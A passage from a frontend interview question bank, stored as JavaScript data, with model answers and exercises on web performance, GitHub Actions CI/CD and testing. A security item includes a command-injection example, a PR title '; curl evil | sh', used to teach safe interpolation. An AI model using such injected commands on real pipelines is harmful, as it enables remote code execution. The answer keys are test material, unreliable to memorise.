          long: `DOM size kills style, layout and memory; 100k nodes is far too many.\nTanStack Virtual / react-window render ~30-50 rows and translate them.\nVariable heights need measurement (measureElement) and can cause jumps.\nCtrl+F cannot find unrendered rows; screen readers need aria-rowcount/aria-rowindex.\nAlternatives: pagination or server-side filtering (often better UX), content-visibility: auto for medium lists.\nKeep row components cheap and memoized; avoid heavy per-row hooks.\nAlso consider data cost: do not ship 100k rows of JSON; page from the server.`,
          ai: true,
          exercises: [
            {
              task: `Speed up a long page with the content visibility CSS property.`,
              description: `Checks CSS alternative. Apply content-visibility to sections of a long static page and measure rendering time in DevTools.`,
              answer: `Add content-visibility: auto; contain-intrinsic-size: auto 500px to each section. Offscreen sections skip rendering, cutting initial render time, while staying in the DOM for find-in-page and accessibility.`,
            },
            {
              task: `Make a virtual table work with screen readers.`,
              description: `Checks a11y with virtualization. List required ARIA attributes for a virtualized table.`,
              answer: `role="grid" or table with aria-rowcount set to the total rows, and aria-rowindex on each rendered row. Keep keyboard focus management in a roving tabindex so focus survives row recycling.`,
            },
          ],
        },
      ],
      techlead: [
        {
          q: `How do you set speed limits for pages and catch slowdowns in CI for many teams?`,
          short: `Define budgets per route (JS kB, LCP, INP proxies), enforce bundle-size and Lighthouse CI checks on PRs, track field data dashboards, and assign owners with clear escalation when budgets are broken.`,
          long: `Budgets derived from field targets: e.g. p75 LCP < 2.5s, INP < 200ms, initial JS < 170kB gzip per route.\nPR-level: size-limit or bundle analyzer diff comment; Lighthouse CI with assertions and multiple runs to reduce noise.\nMain-level: nightly synthetic runs (WebPageTest/Lighthouse) storing history.\nField: RUM dashboard per team/route with alerts on p75 regressions.\nOwnership: each route has an owning team; breaking a budget requires an approved exception with expiry.\nMake it cheap to do right: shared image component, lazy route template, dependency review.\nReview trends in a monthly perf review, not ad hoc heroics.`,
          ai: true,
          exercises: [
            {
              task: `Write Lighthouse CI rules for load time and script size.`,
              description: `Checks configuration. Create lighthouserc.json asserting LCP < 2500ms and total JS < 170kB, 3 runs.`,
              answer: `Use ci.collect.numberOfRuns: 3 and ci.assert.assertions with largest-contentful-paint maxNumericValue 2500 and resource-summary:script:size maxNumericValue 174080. Multiple runs use the median to reduce flakiness.`,
              solution: `{ "ci": { "collect": { "numberOfRuns": 3 }, "assert": { "assertions": {
  "largest-contentful-paint": ["error", { "maxNumericValue": 2500 }],
  "resource-summary:script:size": ["error", { "maxNumericValue": 174080 }]
} } } }`,
            },
            {
              task: `A team needs to go over the size limit. What is the process?`,
              description: `Checks governance. Describe how a team ships a feature that exceeds the JS budget.`,
              answer: `They file a budget exception with justification, measured impact and a remediation date; a perf champion approves. The budget is temporarily raised with an expiry, and a follow-up ticket is tracked until the budget is restored.`,
            },
          ],
        },
        {
          q: `Marketing wants five new third party scripts. How do you handle this request?`,
          short: `Require a business case and owner per script, measure each one's cost, load them after consent and after the main content (or via a tag manager with governance / Partytown), set a third-party budget and review periodically.`,
          long: `Third parties are the top cause of poor INP and privacy risk.\nEvaluate: necessity, overlap (do two tools do the same?), size, main-thread time, privacy/GDPR.\nLoad strategy: async/defer, after load or on interaction (chat widget on click), consent-gated.\nA/B tools that hide the page (anti-flicker) hurt LCP; prefer server-side experiments.\nIsolate where possible: Partytown (worker), iframes, server-side tagging.\nCSP allowlists and SRI where feasible.\nQuarterly audit: remove unused tags, report cost per tag to stakeholders.`,
          ai: true,
          exercises: [
            {
              task: `Load the chat widget only after the first click.`,
              description: `Checks facade pattern. Write code that shows a fake chat button and loads the vendor script on first click.`,
              answer: `Render a lightweight button; on click, create a script element with the vendor src, append it and open the widget when it loads. The page avoids hundreds of kB until a user actually wants chat.`,
            },
            {
              task: `Measure how much each third party script costs.`,
              description: `Checks measurement. Use DevTools Performance "Third-party" grouping or Lighthouse "Reduce the impact of third-party code" to report per-vendor main-thread time.`,
              answer: `Lighthouse lists each third-party entity with transfer size and blocking time. Presenting that table with business value per tool lets stakeholders make an informed keep/remove decision.`,
            },
          ],
        },
        {
          q: `This speed tracking code sends the wrong data. Fix it.`,
          code: `window.addEventListener('load', () => {
  fetch('/rum', {
    method: 'POST',
    body: JSON.stringify({ load: performance.now() }),
  });
});`,
          short: `"load time" is not a user-centric metric and the fetch may be dropped. Report Core Web Vitals with web-vitals, batch them, send with sendBeacon on visibilitychange, and sample traffic.`,
          long: `onload says little about what users experience; LCP, INP, CLS and TTFB do.\nINP and CLS are final only when the page is hidden, so report on visibilitychange (hidden).\nfetch during unload can be cancelled; sendBeacon or fetch keepalive survive.\nBatch metrics in one payload and sample (e.g. 10%) to control cost.\nAdd context: route, release version, device, effectiveType for segmentation.\nUse the attribution build to know what element or interaction caused the score.`,
          fix: `import { onLCP, onINP, onCLS, onTTFB } from 'web-vitals/attribution';
const queue = [];
const sampled = Math.random() < 0.1;
const add = (m) => sampled && queue.push({ name: m.name, value: m.value, route: location.pathname, release: __RELEASE__ });
[onLCP, onINP, onCLS, onTTFB].forEach((fn) => fn(add));
addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden' && queue.length) {
    navigator.sendBeacon('/rum', JSON.stringify(queue.splice(0)));
  }
});`,
          exercises: [
            {
              task: `Choose what percent of users to track.`,
              description: `Checks cost/accuracy trade-off. 50M page views a month; justify a sample rate.`,
              answer: `Even 1-5% gives hundreds of thousands of samples, enough for p75 by route and device. Sample per session, not per event, so a session's metrics stay together; raise the rate for low-traffic critical routes.`,
            },
            {
              task: `Write a query for INP per page and per release.`,
              description: `Checks analysis. Write pseudo-SQL computing p75 INP per route per release.`,
              answer: `SELECT route, release, approx_percentile(value, 0.75) FROM rum WHERE name = 'INP' GROUP BY route, release. Comparing releases side by side reveals which deploy caused a regression.`,
            },
          ],
        },
      ],
    },

    'CI/CD': {
      junior: [
        {
          q: `What is a lockfile? Why does CI use npm ci instead of npm install?`,
          short: `A lockfile records the exact version of every package. npm ci installs exactly those versions and fails if the lockfile and package.json do not match.`,
          long: `package.json allows version ranges like ^1.2.0, so two installs can get different versions.
package-lock.json pins every package, including nested ones, to one exact version.
npm ci deletes node_modules, installs only from the lockfile and never changes it, so builds are repeatable.
npm install can update the lockfile, which hides problems in CI.
Always commit the lockfile and review changes to it.
Strong answer: explains ranges, repeatable builds and why CI must not change the lockfile.`,
          follow: `What should you check when a pull request changes the lockfile a lot?`,
          exercises: [
            {
              task: `CI passes on Monday and fails on Tuesday with no code change. What is a likely cause?`,
              description: `Checks the role of the lockfile.`,
              answer: `A dependency released a new version inside the allowed range and CI installed it because there was no lockfile or it used npm install. Commit the lockfile and use npm ci.`,
            },
            {
              task: `npm ci fails with "lockfile out of sync". What do you do?`,
              description: `Checks the fix flow.`,
              answer: `Run npm install locally to update the lockfile, check the diff, and commit both package.json and the lockfile together.`,
            },
          ],
        },
        {
          q: `Fix this GitHub Actions workflow. It should run on pull requests and use a current Node version.`,
          code: `name: CI
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v1
        with:
          node-version: 14
      - run: npm install
      - run: npm test`,
          short: `It never checks out code, uses an EOL Node and an old action, only runs on push, and uses npm install. Add checkout, setup-node v4 with Node 22 and caching, trigger on pull_request, and use npm ci.`,
          long: `Without actions/checkout the repo is not in the runner.\nNode 14 is end-of-life; use an active LTS (22 or 24).\nsetup-node v4 supports cache: npm for faster installs.\nTrigger on pull_request and push to main.\nnpm ci for reproducible installs.\nAdd lint and build steps so broken builds are caught.`,
          fix: `name: CI
on:
  pull_request:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build`,
          exercises: [
            {
              task: `A job fails because it cannot find package dot json. Why?`,
              description: `Checks debugging. A job fails with "npm ERR! enoent package.json".`,
              answer: `The repository was not checked out (missing actions/checkout) or the step runs in the wrong working-directory. Add checkout or set defaults.run.working-directory to the package folder.`,
            },
            {
              task: `Read the Node version from the nvmrc file.`,
              description: `Checks single source of truth. Make setup-node read the version from .nvmrc.`,
              answer: `Replace node-version with node-version-file: .nvmrc. Local development and CI then use the same Node version from one file, avoiding "works on my machine" mismatches.`,
            },
          ],
        },
        {
          q: `What is a build artifact? Why should you build once and deploy the same thing everywhere?`,
          short: `An artifact is the output of the build (e.g. dist/ or a Docker image). Building once guarantees staging and production run exactly the same code; config differs, not the bundle.`,
          long: `Rebuilding per environment can produce different outputs (dependency updates, env vars, timing).\nWhat you tested in staging should be byte-identical to production.\nStore artifacts with a version/commit SHA (actions/upload-artifact, registry, S3).\nEnvironment-specific values come from runtime config (config.json, env injected at serve time), not build-time variables.\nVite's import.meta.env values are baked in at build time, which is why runtime config matters.\nRollback = redeploy a previous artifact.`,
          exercises: [
            {
              task: `Pass the build folder from one job to another.`,
              description: `Checks Actions artifacts. Write steps uploading dist in a build job and downloading it in a deploy job.`,
              answer: `Use actions/upload-artifact@v4 with name: dist and path: dist in build, then needs: build and actions/download-artifact@v4 with name: dist in deploy. The deploy job ships exactly what was built and tested.`,
            },
            {
              task: `Use a different API address in staging and production without a new build.`,
              description: `Checks build-time vs runtime config.`,
              answer: `Serve a /config.json (or inject window.__CONFIG__ in index.html) per environment and fetch it at startup. The JS bundle stays identical; only the small config file differs.`,
            },
          ],
        },
      ],
      middle: [
        {
          q: `How do you make a GitHub Actions pipeline faster? Think about cache, parallel jobs, and matrix.`,
          short: `Cache dependencies and build tool caches, split lint/test/build into parallel jobs, shard tests with a matrix, and skip work using path filters and concurrency cancellation.`,
          long: `setup-node cache: npm caches ~/.npm keyed by lockfile.\nactions/cache for tool caches (Vite, Turbo, Playwright browsers).\nIndependent jobs (lint, typecheck, unit) run in parallel; E2E needs build.\nMatrix shards: Playwright --shard=1/4 across 4 runners.\nconcurrency with cancel-in-progress kills outdated runs on the same branch.\npaths / paths-ignore avoid running frontend CI for docs-only changes.\nMonorepos: Nx/Turborepo affected-only builds with remote cache.`,
          exercises: [
            {
              task: `Split Playwright tests across four machines.`,
              description: `Checks matrix. Write a job running Playwright in 4 shards.`,
              answer: `Use strategy.matrix.shard: [1, 2, 3, 4] and run npx playwright test --shard=\${{ matrix.shard }}/4. Upload blob reports from each shard and merge them with npx playwright merge-reports in a final job.`,
              solution: `strategy:
  fail-fast: false
  matrix:
    shard: [1, 2, 3, 4]
steps:
  - run: npx playwright test --shard=\${{ matrix.shard }}/4`,
            },
            {
              task: `Cancel old runs when someone pushes a new commit.`,
              description: `Checks concurrency. Add a block so new pushes cancel older runs of the same PR.`,
              answer: `concurrency: group: ci-\${{ github.ref }}, cancel-in-progress: true. Only the newest commit's run continues, saving runner minutes and giving faster feedback.`,
            },
          ],
        },
        {
          q: `This workflow leaks a secret and has too many rights. Fix it.`,
          code: `on: pull_request_target
permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - run: echo "Token is \${{ secrets.DEPLOY_TOKEN }}"
      - run: npm ci && npm test`,
          short: `pull_request_target with checkout of the PR head runs untrusted fork code with secrets and write tokens. Use pull_request, least-privilege permissions, never echo secrets, and pin third-party actions.`,
          long: `pull_request_target runs in the base repo context with secrets; checking out the PR head lets an attacker's npm scripts steal them.\nUse pull_request for building/testing untrusted code; it gets no secrets for forks.\npermissions: contents: read by default; grant more per job only when needed.\nNever print secrets; masking is not reliable for transformed values.\nInterpolating untrusted input (PR title) in run: enables script injection; pass via env.\nPin third-party actions to a commit SHA; use OIDC instead of long-lived cloud keys.`,
          fix: `on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm test`,
          exercises: [
            {
              task: `Make it safe to print the pull request title.`,
              description: `Checks safe interpolation. Fix: run: echo "\${{ github.event.pull_request.title }}".`,
              answer: `A title like "; curl evil | sh" is executed by the shell. Put it in env: TITLE: \${{ github.event.pull_request.title }} and use "$TITLE" in the script, so it is treated as data.`,
            },
            {
              task: `Deploy to AWS without saved AWS keys.`,
              description: `Checks keyless auth (OIDC). Describe deploying to S3 without stored keys.`,
              answer: `Grant permissions: id-token: write, use aws-actions/configure-aws-credentials with role-to-assume. AWS trusts GitHub's OIDC token for that repo/branch and returns short-lived credentials, so no long-lived secret exists.`,
            },
          ],
        },
        {
          q: `What are blue green and canary deployments? How do they work for a single page app?`,
          short: `Blue-green keeps two full environments and switches traffic at once; canary sends a small share of traffic to the new version and increases it while monitoring. For SPAs, it usually means switching index.html versions at the CDN/edge.`,
          long: `Blue-green: deploy to idle environment, smoke test, flip router; rollback = flip back.\nCanary: 1% -> 10% -> 100% with automated checks on error rates and vitals.\nSPA specifics: hashed assets for both versions must coexist so open tabs don't 404 on chunks.\nRoute by cookie for stickiness so a user doesn't bounce between versions.\nTag errors and RUM with the release version to compare canary vs baseline.\nFeature flags offer finer-grained progressive delivery per feature.\nHandle chunk-load errors after deploys with a reload prompt.`,
          exercises: [
            {
              task: `Handle missing code files after a new deploy.`,
              description: `Checks deploy resilience. Write a handler for Vite's vite:preloadError event.`,
              answer: `window.addEventListener('vite:preloadError', () => location.reload()) (optionally guard against loops with sessionStorage). Also keep old assets on the CDN for a while so most users never hit missing chunks.`,
            },
            {
              task: `Which numbers should stop a canary release?`,
              description: `Checks automation. List metrics that should auto-abort a canary.`,
              answer: `JS error rate vs baseline, API 5xx rate, p75 LCP/INP regression and key business conversion (e.g. form submit success). Breaching thresholds for N minutes triggers automatic rollback.`,
            },
          ],
        },
      ],
      senior: [
        {
          q: `Every push starts a new end-to-end run, and old runs keep going. Add concurrency control and path filters.`,
          code: `on: [push]
jobs:
  e2e:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npx playwright test`,
          short: `Use a concurrency group per branch with cancel-in-progress so only the latest run continues, and run heavy jobs only when relevant files change.`,
          long: `Pushing three commits quickly starts three full runs; only the last one matters.
concurrency with a group per workflow and branch cancels older runs.
Do not cancel runs on main if each deploy must finish; use cancel-in-progress only for pull requests.
paths and paths-ignore skip the workflow when only docs change.
Also add a timeout so a stuck run does not use minutes for hours.
Strong answer: knows concurrency, when not to cancel, and path filters with their required-check trap.`,
          fix: `on:
  pull_request:
    paths: ['src/**', 'tests/**', 'package-lock.json']
concurrency:
  group: e2e-\${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true
jobs:
  e2e:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npx playwright test`,
          follow: `Why should deploy jobs on main usually not use cancel-in-progress?`,
          exercises: [
            {
              task: `Split the end-to-end tests into four parallel parts.`,
              description: `Checks matrix sharding.`,
              answer: `Use a matrix with shard numbers and pass them to Playwright.`,
              solution: `strategy:
  matrix:
    shard: [1, 2, 3, 4]
steps:
  - run: npx playwright test --shard=\${{ matrix.shard }}/4`,
            },
            {
              task: `What happens to a deploy if a newer push cancels it halfway?`,
              description: `Checks risk of cancelling deploys.`,
              answer: `The deploy can stop in a half-done state, for example files uploaded but cache not cleared. For deploys use a concurrency group without cancel-in-progress so runs queue instead.`,
            },
          ],
        },
        {
          q: `How do you protect a frontend project from attacks through its dependencies and CI?`,
          short: `Lock and audit dependencies, pin actions by SHA, least-privilege tokens, OIDC instead of static secrets, provenance/attestations for artifacts, and review new dependencies and install scripts.`,
          long: `Lockfile committed, npm ci, and Dependabot/Renovate with grouped updates and minimum release age.\nnpm audit / GitHub dependency review action blocks PRs adding vulnerable packages.\nWorms like Shai-Hulud (2025) spread via postinstall scripts and stolen npm tokens: consider ignore-scripts, trusted publishing and 2FA.\nPin third-party actions to full commit SHAs; restrict allowed actions at org level.\nGITHUB_TOKEN default read-only; OIDC for cloud deploys.\nArtifact attestations (actions/attest-build-provenance) and npm provenance prove where builds came from.\nSecret scanning and push protection enabled.`,
          ai: true,
          exercises: [
            {
              task: `Block pull requests that add unsafe packages.`,
              description: `Checks PR gating. Add actions/dependency-review-action failing on high severity.`,
              answer: `On pull_request add a step uses: actions/dependency-review-action@v4 with fail-on-severity: high. It diffs the lockfile and blocks PRs that introduce known-vulnerable or disallowed-license packages.`,
            },
            {
              task: `Why is using an action by version tag risky? How do you fix it?`,
              description: `Checks SHA pinning for uses: some/action@v2.`,
              answer: `Tags are mutable; a compromised maintainer can repoint v2 to malicious code (as in the tj-actions incident in 2025). Pin to the full commit SHA with a comment of the version, and let Renovate update it.`,
            },
          ],
        },
        {
          q: `How do you change the API and deploy the frontend so they never break each other?`,
          short: `Use expand-and-contract: ship backward-compatible backend changes first, deploy the frontend that uses them, then remove the old path later. Keep frontend tolerant of both shapes during the transition.`,
          long: `Frontend and backend deploy independently and users have old SPA versions open for hours.\nExpand: add new field/endpoint while keeping the old one.\nMigrate: frontend switches to the new contract, possibly behind a flag.\nContract: remove old field only once telemetry shows no old clients.\nNever deploy a frontend that requires an API not yet live; gate with flags or capability checks.\nVersion the client (send X-Client-Version) so backend can detect stale clients.\nForce-refresh old clients when a hard break is unavoidable.`,
          ai: true,
          exercises: [
            {
              task: `Plan how to rename one field in the API and the app.`,
              description: `Checks expand-contract. Plan renaming applicantName to fullName across API and SPA.`,
              answer: `Backend returns both fields; frontend reads fullName ?? applicantName; deploy frontend; monitor client versions; then stop returning applicantName and remove the fallback. Each step is independently deployable and reversible.`,
            },
            {
              task: `How does the app know a new version is live?`,
              description: `Checks version handling.`,
              answer: `Poll /version.json (or read a header on API responses) and compare to the build's version; when different, show a "New version available, reload" banner. For breaking changes, the API can return 426 to force reload.`,
            },
          ],
        },
      ],
      techlead: [
        {
          q: `Ten frontend teams share one big repository. How do you design CI and CD for them?`,
          short: `Reusable workflows and shared actions owned by a platform team, affected-only builds with remote caching, standard quality gates, independent deploys per app, and metrics on pipeline speed and reliability.`,
          long: `Nx or Turborepo with remote cache: run only affected projects.\nReusable workflows (workflow_call) encode lint/test/build/deploy; teams opt in, not copy-paste.\nCODEOWNERS and required checks per path.\nIndependent deploy units per app with their own environments and approvals.\nPipeline SLOs: p50 PR feedback < 10 min, flake rate < 1%.\nSelf-hosted or larger runners for heavy jobs; cost monitoring.\nPlatform team runs an internal "paved road" with docs and office hours.`,
          ai: true,
          exercises: [
            {
              task: `Call a shared workflow from an app workflow.`,
              description: `Checks workflow_call. Show how an app workflow calls a shared one with inputs.`,
              answer: `In the app: jobs: ci: uses: org/ci-templates/.github/workflows/frontend.yml@v3 with: app: admissions node: 22 secrets: inherit. The shared file declares on: workflow_call with inputs, keeping logic in one versioned place.`,
            },
            {
              task: `Name four pipeline numbers you share every month.`,
              description: `Checks measurement.`,
              answer: `Median and p90 PR pipeline duration, flaky test rate, main branch red time, and deployment frequency/lead time per app. They show where platform investment pays off.`,
            },
          ],
        },
        {
          q: `A config change skipped CI and caused an outage. How do you fix the process without slowing the team?`,
          short: `Run a blameless postmortem, make the safe path the easy path (config as code through the same pipeline, validation, staged rollout), protect production with required checks, and keep a documented break-glass path.`,
          long: `Postmortem focuses on systems: why was bypass possible and attractive?\nMove config into the repo or a flag system with audit logs, validation schemas and review.\nBranch protection and required status checks on main; environment protection for production.\nProgressive rollout for config too (flags percentage, canary).\nBreak-glass procedure: allowed in emergencies, logged, reviewed after.\nAutomate validation so it costs seconds, not approvals that take days.\nTrack action items to completion and share learnings.`,
          ai: true,
          exercises: [
            {
              task: `Check config files against a schema in CI.`,
              description: `Checks schema validation. Add a step validating config/*.json against a JSON Schema with ajv-cli.`,
              answer: `Run npx ajv-cli validate -s config.schema.json -d "config/*.json" in CI. Invalid types or missing required keys fail the PR instead of production.`,
            },
            {
              task: `Write three clear action items after the outage.`,
              description: `Checks follow-through. Draft 3 SMART action items.`,
              answer: `Enforce branch protection on config repo by Friday (owner: platform); add schema validation job within 2 weeks (owner: team A); add config change alert to the incident channel this sprint (owner: SRE). Each has an owner and date.`,
            },
          ],
        },
        {
          q: `Fix this release workflow. Deploys must be approved, easy to trace, and easy to undo.`,
          code: `on:
  push:
    branches: [main]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - run: aws s3 sync dist s3://prod-bucket --delete
        env:
          AWS_ACCESS_KEY_ID: \${{ secrets.AWS_KEY }}
          AWS_SECRET_ACCESS_KEY: \${{ secrets.AWS_SECRET }}`,
          short: `It deploys every push with static keys, no approval, no versioning, and --delete removes assets old tabs still need. Use an environment with reviewers, OIDC, versioned deploy paths, keep old assets, and record the release.`,
          long: `environment: production adds required reviewers and scoped secrets.\nOIDC role replaces long-lived keys.\nUpload hashed assets without --delete (expire via lifecycle rules) so open sessions keep working.\nUpload index.html last with no-cache so the switch is atomic.\nTag the commit/create a GitHub release and send the version to Sentry for traceability.\nRollback = re-run deploy of a previous tag or restore the previous index.html.\nconcurrency: production prevents overlapping deploys.`,
          fix: `on:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: write
jobs:
  release:
    runs-on: ubuntu-latest
    environment: production
    concurrency: production
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci && npm run build
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: \${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: us-east-1
      - run: aws s3 sync dist/assets s3://prod-bucket/assets --cache-control "public,max-age=31536000,immutable"
      - run: aws s3 cp dist/index.html s3://prod-bucket/index.html --cache-control "no-cache"
      - run: gh release create "v\${{ github.run_number }}" --target "\${{ github.sha }}" --generate-notes
        env:
          GH_TOKEN: \${{ github.token }}`,
          exercises: [
            {
              task: `Design a one click rollback.`,
              description: `Checks reversibility for this setup.`,
              answer: `Add a workflow_dispatch workflow taking a release tag, rebuilding or downloading that release's artifact and re-uploading its index.html (assets are still present). Because assets are immutable and retained, rollback takes seconds.`,
            },
            {
              task: `Show which release caused each error in Sentry.`,
              description: `Checks observability.`,
              answer: `Inject the release version at build time, set it in Sentry.init({ release }), upload source maps for that release and create a deploy record from CI. Sentry then shows "first seen in release X" and suspect commits.`,
            },
          ],
        },
      ],
    },

    'Testing (Unit, Integration, E2E, Visual regression, Accessibility, Performance etc)': {
      junior: [
        {
          q: `What makes a good unit test? Explain the Arrange, Act, Assert pattern.`,
          short: `A good unit test is fast, isolated, deterministic, tests one behavior and has a clear name. AAA structures it: set up data, perform the action, verify the outcome.`,
          long: `Arrange: create inputs and mocks.\nAct: call the function or trigger the event once.\nAssert: check the observable result, not internal details.\nName tests by behavior: "returns 0 for empty cart".\nNo shared mutable state between tests; each can run alone and in any order.\nDeterministic: control time and randomness.\nFailing message should explain what broke.`,
          exercises: [
            {
              task: `Write a Vitest test for a sum function.`,
              description: `Checks AAA. Test sum(items) returning total price; run npx vitest run.`,
              answer: `Arrange an array of items with prices, act by calling sum, and assert with expect(result).toBe(30). Add a second test for an empty array returning 0 to cover the edge case.`,
              solution: `import { test, expect } from 'vitest';
test('sums item prices', () => {
  const items = [{ price: 10 }, { price: 20 }];
  expect(sum(items)).toBe(30);
});`,
            },
            {
              task: `Give these tests better names.`,
              description: `Checks clarity. Rename tests called "test1", "works", "handles error".`,
              answer: `Use behavior-focused names like "formats date as YYYY-MM-DD", "returns empty list when API responds 404", "throws ValidationError for negative quantity". A failing test name should tell you the broken requirement.`,
            },
          ],
        },
        {
          q: `Why does this test pass when the code is broken?`,
          code: `test('loads user', () => {
  fetchUser(1).then((user) => {
    expect(user.name).toBe('Ann');
  });
});`,
          short: `The test does not return or await the promise, so it finishes before the assertion runs. Make it async and await the result.`,
          long: `The runner sees a synchronous function that returns undefined and marks it passed.\nThe assertion runs later (or never) and its failure is lost or reported elsewhere.\nUse async/await or return the promise.\nexpect.assertions(1) guarantees an assertion actually ran.\nFor rejections use await expect(p).rejects.toThrow().\nESLint rules (vitest/valid-expect, no-floating-promises) catch this.`,
          fix: `test('loads user', async () => {
  const user = await fetchUser(1);
  expect(user.name).toBe('Ann');
});`,
          exercises: [
            {
              task: `Test that a function throws an error for a bad id.`,
              description: `Checks async error assertions. Write a test that fetchUser(-1) rejects with "Invalid id".`,
              answer: `Use await expect(fetchUser(-1)).rejects.toThrow('Invalid id'). Forgetting await here has the same false-positive problem as the original test.`,
            },
            {
              task: `Which lint rule finds this mistake?`,
              description: `Checks tooling. Run npm run lint.`,
              answer: `@typescript-eslint/no-floating-promises (type-aware) flags the unhandled promise, and vitest/valid-expect flags async expectations not awaited. Enabling them prevents this class of fake-green test.`,
            },
          ],
        },
        {
          q: `What is code coverage? Does one hundred percent coverage mean good tests?`,
          short: `Coverage measures which lines/branches ran during tests. 100% does not mean correct: tests may run code without asserting meaningful behavior.`,
          long: `Types: statement, line, branch, function coverage; branch is most useful.\nVitest: vitest run --coverage with the v8 provider.\nCoverage shows untested code, which is valuable for finding gaps.\nIt cannot show missing requirements or weak assertions.\nChasing 100% encourages testing trivial code and implementation details.\nMutation testing (Stryker) measures whether tests detect changes.`,
          exercises: [
            {
              task: `Create a coverage report and read it.`,
              description: `Checks tooling. Run npx vitest run --coverage and open coverage/index.html.`,
              answer: `The report shows per-file percentages and highlights uncovered lines and branches in red/yellow. The candidate should pick an uncovered branch (e.g. an error path) and add a test for it.`,
            },
            {
              task: `Write a test with full coverage that checks nothing.`,
              description: `Checks critical thinking.`,
              answer: `Calling the function with inputs that hit every branch without any expect gives 100% coverage and zero protection. This shows why assertion quality and behavior focus matter more than the number.`,
            },
          ],
        },
      ],
      middle: [
        {
          q: `This test checks CSS classes and waits with real timers. Fix it.`,
          code: `test('shows toast then hides it', async () => {
  const { container } = render(<Toast message="Saved" />);
  expect(container.querySelector('.toast-visible')).not.toBeNull();
  await new Promise((r) => setTimeout(r, 3000));
  expect(container.querySelector('.toast-visible')).toBeNull();
});`,
          short: `It queries CSS classes and actually waits 3 seconds. Query by role/text like a user and use fake timers to advance time instantly.`,
          long: `Class names are implementation details; refactors break the test without breaking behavior.\nReal waits make suites slow and flaky.\nvi.useFakeTimers() + vi.advanceTimersByTime(3000) is instant and deterministic.\nWrap timer advancement in act so React flushes updates.\nQuery with screen.getByRole('status') or getByText.\nRestore real timers in afterEach.`,
          fix: `beforeEach(() => vi.useFakeTimers());
afterEach(() => vi.useRealTimers());
test('shows toast then hides it', () => {
  render(<Toast message="Saved" />);
  expect(screen.getByRole('status')).toHaveTextContent('Saved');
  act(() => { vi.advanceTimersByTime(3000); });
  expect(screen.queryByRole('status')).not.toBeInTheDocument();
});`,
          exercises: [
            {
              task: `Make user event work with fake timers.`,
              description: `Checks integration of tools. Configure userEvent to work with vi fake timers.`,
              answer: `Create the user with userEvent.setup({ advanceTimers: vi.advanceTimersByTime }). Otherwise userEvent's internal delays wait on timers that never advance and the test hangs.`,
            },
            {
              task: `Choose the best query for three elements.`,
              description: `Checks query priority. Pick queries for a submit button, an email input with a label and an error message.`,
              answer: `getByRole('button', { name: /submit/i }), getByLabelText(/email/i) or getByRole('textbox', { name: /email/i }), and getByRole('alert') or getByText for the error. These mirror how users and assistive tech find elements.`,
            },
          ],
        },
        {
          q: `How do you mock network calls with MSW? Why is it better than mocking fetch?`,
          short: `MSW intercepts requests at the network level with handlers describing API responses, so components use their real fetch/client code. It works in Vitest (Node) and the browser and can be reused in Storybook.`,
          long: `Mocking fetch couples tests to how the code calls fetch (axios vs fetch, URL building).\nMSW handlers: http.get('/api/users', () => HttpResponse.json([...])).\nsetupServer in Node for Vitest; setupWorker in the browser.\nOverride per test with server.use() for errors and edge cases.\nonUnhandledRequest: 'error' catches missing mocks.\nResetHandlers after each test to keep tests isolated.\nHandlers can be generated from OpenAPI to stay in sync with the contract.`,
          exercises: [
            {
              task: `Set up MSW in Vitest with one handler.`,
              description: `Checks setup. Write the setup file and one handler; run npx vitest.`,
              answer: `Create server = setupServer(...handlers) and in setup file call beforeAll(() => server.listen({ onUnhandledRequest: 'error' })), afterEach(() => server.resetHandlers()), afterAll(() => server.close()). Tests then render components normally.`,
              solution: `import { setupServer } from 'msw/node';
import { http, HttpResponse } from 'msw';
export const server = setupServer(
  http.get('/api/users', () => HttpResponse.json([{ id: 1, name: 'Ann' }])),
);`,
            },
            {
              task: `Test what the page shows when the server returns an error.`,
              description: `Checks per-test overrides. Make /api/users return 500 in one test and assert the error UI.`,
              answer: `Inside the test call server.use(http.get('/api/users', () => new HttpResponse(null, { status: 500 }))), render, then await screen.findByRole('alert'). resetHandlers restores the default for other tests.`,
            },
          ],
        },
        {
          q: `How do you add automatic accessibility checks to your tests? What can they not find?`,
          short: `Use axe-core via vitest-axe/jest-axe in component tests and @axe-core/playwright in E2E. Automated tools catch roughly a third to half of issues; keyboard flow, focus management, meaningful labels and screen reader UX need manual checks.`,
          long: `Component: const results = await axe(container); expect(results).toHaveNoViolations().\nE2E: new AxeBuilder({ page }).withTags(['wcag2a','wcag2aa','wcag22aa']).analyze().\nScan each state (modal open, errors shown), not only initial load.\nCatches: missing labels, contrast, invalid ARIA, missing alt.\nMisses: logical focus order, whether alt text is meaningful, keyboard traps in custom widgets, announcements timing.\nAdd keyboard-only Playwright tests for critical flows.\nPeriodic manual audits with NVDA/VoiceOver.`,
          exercises: [
            {
              task: `Scan the login page with axe in Playwright.`,
              description: `Checks E2E a11y for WCAG 2.2 AA; run npx playwright test.`,
              answer: `Import AxeBuilder from '@axe-core/playwright', navigate, run analyze with WCAG tags and expect(results.violations).toEqual([]). Attach results to the report for debugging failures.`,
              solution: `test('login is accessible', async ({ page }) => {
  await page.goto('/login');
